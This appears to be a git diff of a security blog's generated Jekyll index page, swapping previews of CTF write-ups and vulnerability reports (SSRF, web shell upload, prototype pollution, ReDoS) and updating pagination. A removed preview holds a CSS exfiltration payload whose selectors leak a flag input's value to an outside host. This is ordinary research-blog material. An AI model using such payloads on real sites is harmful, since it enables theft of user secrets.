@@ -39,15 +39,16 @@
 <meta property="og:locale" content="en" />
 <meta name="description" content="A minimal, responsive and feature-rich Jekyll theme for technical writing." />
 <meta property="og:description" content="A minimal, responsive and feature-rich Jekyll theme for technical writing." />
-<link rel="canonical" href="http://localhost:4000/" />
-<meta property="og:url" content="http://localhost:4000/" />
+<link rel="canonical" href="http://localhost:4000/page5/" />
+<meta property="og:url" content="http://localhost:4000/page5/" />
 <meta property="og:site_name" content="Web2.0" />
 <meta property="og:type" content="website" />
-<link rel="next" href="http://localhost:4000/page2" />
+<link rel="prev" href="http://localhost:4000/page4" />
+<link rel="next" href="http://localhost:4000/page6" />
 <meta name="twitter:card" content="summary" />
 <meta property="twitter:title" content="Web2.0" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"WebSite","description":"A minimal, responsive and feature-rich Jekyll theme for technical writing.","headline":"Web2.0","name":"anonymous","sameAs":["https://x.com/l0ptus"],"url":"http://localhost:4000/"}</script>
+{"@context":"https://schema.org","@type":"WebPage","description":"A minimal, responsive and feature-rich Jekyll theme for technical writing.","headline":"Web2.0","url":"http://localhost:4000/page5/"}</script>
 <!-- End Jekyll SEO tag -->
 
   
@@ -673,14 +674,14 @@
 <div id="post-list" class="flex-grow-1 px-xl-1">
   
     <article class="card-wrapper card">
-      <a href="/posts/Just-CTF-2025/" class="post-preview row g-0 flex-md-row-reverse">
+      <a href="/posts/RealWrold-CTF/" class="post-preview row g-0 flex-md-row-reverse">
         
 
         
 
         <div class="col-md-12">
           <div class="card-body d-flex flex-column">
-            <h1 class="card-title my-2 mt-md-0">JustCTF 2025 Positive Players Write Up</h1>
+            <h1 class="card-title my-2 mt-md-0">Real World CTF 4th Hack into Skynet Write Up</h1>
 
             <div class="card-text content mt-0 mb-3">
               <p>
@@ -690,7 +691,11 @@
 
 
 
-                i joined in justctf 2025 to solve web challs, there were 7 web challs and i aimed to solve Simple Tasks and Positive Players. However Simple Tasks was really difficult that i couldn’t even approach...
+                
+There is no sql injection vulnerability in login logic, and login is generally not possible because there is no user account.
+
+def query_login_attempt():
+    username = flask.request.form.get(&#39;use...
               </p>
             </div>
 
@@ -708,11 +713,11 @@
 
 <time
   
-  data-ts="1754179200"
+  data-ts="1643066993"
   data-df="ll"
   
 >
-  Aug  3, 2025
+  Jan 25, 2022
 </time>
 
 
@@ -730,14 +735,14 @@
     </article>
   
     <article class="card-wrapper card">
-      <a href="/posts/css-exfiltration/" class="post-preview row g-0 flex-md-row-reverse">
+      <a href="/posts/CVE-2021-3815/" class="post-preview row g-0 flex-md-row-reverse">
         
 
         
 
         <div class="col-md-12">
           <div class="card-body d-flex flex-column">
-            <h1 class="card-title my-2 mt-md-0">CSS Exfiltration via attr() + image-set() from Chrome 133</h1>
+            <h1 class="card-title my-2 mt-md-0">0-Day, Prototype Pollution in utils.js</h1>
 
             <div class="card-text content mt-0 mb-3">
               <p>
@@ -749,15 +754,10 @@
 
                 Summary
 
-input[name=flag][value^=a]{
-    background: url(&#39;https://evm.pics/a&#39;);
-}
-input[name=flag][value^=b]{
-    background: url(&#39;https://evm.pics/b&#39;);
-}
-/* ... */
 
-In most cases, when exploiting ...
+  The @fabiocaccamo/utils.js is a package that provides methods with multiple functions for the convenience of developers. A vulnerability exists in one method included in this package.
+
+...
               </p>
             </div>
 
@@ -775,11 +775,11 @@ In most cases, when exploiting ...
 
 <time
   
-  data-ts="1744675200"
+  data-ts="1638228593"
   data-df="ll"
   
 >
-  Apr 15, 2025
+  Nov 30, 2021
 </time>
 
 
@@ -797,14 +797,14 @@ In most cases, when exploiting ...
     </article>
   
     <article class="card-wrapper card">
-      <a href="/posts/XSS-in-ML-Framework/" class="post-preview row g-0 flex-md-row-reverse">
+      <a href="/posts/DownUnder-CTF/" class="post-preview row g-0 flex-md-row-reverse">
         
 
         
 
         <div class="col-md-12">
           <div class="card-body d-flex flex-column">
-            <h1 class="card-title my-2 mt-md-0">($10,890) What is XSS in the ML/AI ecosystem, not only web3.0?</h1>
+            <h1 class="card-title my-2 mt-md-0">DownUnderCTF 2021 Write Up</h1>
 
             <div class="card-text content mt-0 mb-3">
               <p>
@@ -814,7 +814,21 @@ In most cases, when exploiting ...
 
 
 
-                Hi guys, i wanna introduce a way to earn $10k bounty on an open-source projects. a month ago, i reported a bug in the ML Framework. and the bug i found was not critical so i needed to find a way to...
+                Web Challenge
+
+Inside Out [100 pts]
+
+
+  Inside Out 문제는 SSRF를 이용해 플래그를 획득하는 문제 입니다.
+
+
+
+
+문제로 들어오면 위와 같이 환영 한다고 인사를 해주며 밑에 Proxy Example라는 링크가 있는 것을 볼 수 있습니다.
+
+
+
+위 링크를 클릭 해 접속을 하면 위와 같이 url 파라미터를 이용해서...
               </p>
             </div>
 
@@ -832,11 +846,11 @@ In most cases, when exploiting ...
 
 <time
   
-  data-ts="1694656853"
+  data-ts="1632698993"
   data-df="ll"
   
 >
-  Sep 14, 2023
+  Sep 27, 2021
 </time>
 
 
@@ -854,14 +868,14 @@ In most cases, when exploiting ...
     </article>
   
     <article class="card-wrapper card">
-      <a href="/posts/ReDos-in-Github/" class="post-preview row g-0 flex-md-row-reverse">
+      <a href="/posts/CCE/" class="post-preview row g-0 flex-md-row-reverse">
         
 
         
 
         <div class="col-md-12">
           <div class="card-body d-flex flex-column">
-            <h1 class="card-title my-2 mt-md-0">0-Day, Copy and Paste ReDoS in github.com</h1>
+            <h1 class="card-title my-2 mt-md-0">CCE 2021 GS 25 Write Up</h1>
 
             <div class="card-text content mt-0 mb-3">
               <p>
@@ -872,13 +886,8 @@ In most cases, when exploiting ...
 
 
                 Summary
-In summary, I found a Self-ReDoS vulnerability in the issue feature of github.com and reported it to HackerOne.
 
-
-Analysis
-
-function onPaste$1(event) {
-    const { currentTarget: el } = eve...
+On the 25th, there was a CCE held by the National Intelligence Service, and at 11:10 pm, a few tens of minutes before the end of the competition, someone I knew asked me to solve it, so I ...
               </p>
             </div>
 
@@ -896,11 +905,11 @@ function onPaste$1(event) {
 
 <time
   
-  data-ts="1691226053"
+  data-ts="1632698993"
   data-df="ll"
   
 >
-  Aug  5, 2023
+  Sep 27, 2021
 </time>
 
 
@@ -918,14 +927,14 @@ function onPaste$1(event) {
     </article>
   
     <article class="card-wrapper card">
-      <a href="/posts/Line-CTF/" class="post-preview row g-0 flex-md-row-reverse">
+      <a href="/posts/WhiteHat-Contest/" class="post-preview row g-0 flex-md-row-reverse">
         
 
         
 
         <div class="col-md-12">
           <div class="card-body d-flex flex-column">
-            <h1 class="card-title my-2 mt-md-0">Line CTF 2023 Write Up</h1>
+            <h1 class="card-title my-2 mt-md-0">Whitehat Contest 2021 Write Up</h1>
 
             <div class="card-text content mt-0 mb-3">
               <p>
@@ -935,18 +944,18 @@ function onPaste$1(event) {
 
 
 
-                
-  (Web) Baby Simple Gocurl 
-  (Web) Adult Simple Gocurl
+                (Web) Imageflare [100 pts]
 
 
-These two challenges require reading flag in the /flag/ path via SSRF.
+  Imageflare 문제는 파일 업로드 취약점을 이용해 웹쉘을 업로드 한 뒤에 RCE를 이용해 플래그를 획득하는 문제입니다.
 
 
 
-(Web) Baby Simple Gocurl
 
-n.startsWith(&quot;https://&quot;) || n.startsWi...
+일단 문제를 보면 위와 같이 파일 업로드 기능이 주어지고, 파일 업로드를 할 때 마다 Pow 값을 맞춰줘야 한다.
+
+import hashlib
+import strin...
               </p>
             </div>
 
@@ -964,11 +973,11 @@ n.startsWith(&quot;https://&quot;) || n.startsWi...
 
 <time
   
-  data-ts="1679821253"
+  data-ts="1631489393"
   data-df="ll"
   
 >
-  Mar 26, 2023
+  Sep 13, 2021
 </time>
 
 
@@ -996,8 +1005,8 @@ n.startsWith(&quot;https://&quot;) || n.startsWi...
     <!-- left arrow -->
     
 
-    <li class="page-item disabled">
-      <a class="page-link" href="#" aria-label="previous-page">
+    <li class="page-item ">
+      <a class="page-link" href="/page4" aria-label="previous-page">
         <i class="fas fa-angle-left"></i>
       </a>
     </li>
@@ -1017,47 +1026,11 @@ n.startsWith(&quot;https://&quot;) || n.startsWi...
 
       
         <!-- show number -->
-        <li class="page-item  active">
+        <li class="page-item ">
           <a
             class="page-link"
             href="/"
           >1</a>
-        </li>
-      
-    
-      
-      
-      
-      
-      
-
-      
-
-      
-        <!-- show number -->
-        <li class="page-item ">
-          <a
-            class="page-link"
-            href="/page2"
-          >2</a>
-        </li>
-      
-    
-      
-      
-      
-      
-      
-
-      
-
-      
-        <!-- show number -->
-        <li class="page-item ">
-          <a
-            class="page-link"
-            href="/page3"
-          >3</a>
         </li>
       
     
@@ -1101,8 +1074,49 @@ n.startsWith(&quot;https://&quot;) || n.startsWi...
       
 
       
-        <!-- hide number -->
-        
+        <!-- show number -->
+        <li class="page-item ">
+          <a
+            class="page-link"
+            href="/page4"
+          >4</a>
+        </li>
+      
+    
+      
+      
+      
+      
+      
+
+      
+
+      
+        <!-- show number -->
+        <li class="page-item  active">
+          <a
+            class="page-link"
+            href="/page5"
+          >5</a>
+        </li>
+      
+    
+      
+      
+      
+      
+      
+
+      
+
+      
+        <!-- show number -->
+        <li class="page-item ">
+          <a
+            class="page-link"
+            href="/page6"
+          >6</a>
+        </li>
       
     
       
@@ -1126,7 +1140,7 @@ n.startsWith(&quot;https://&quot;) || n.startsWi...
 
     <!-- mobile pagination -->
     <li class="page-index align-middle">
-      <span>1</span>
+      <span>5</span>
       <span class="text-muted">/ 7</span>
     </li>
 
@@ -1134,7 +1148,7 @@ n.startsWith(&quot;https://&quot;) || n.startsWi...
     
 
     <li class="page-item ">
-      <a class="page-link" href="/page2" aria-label="next-page">
+      <a class="page-link" href="/page6" aria-label="next-page">
         <i class="fas fa-angle-right"></i>
       </a>
     </li>
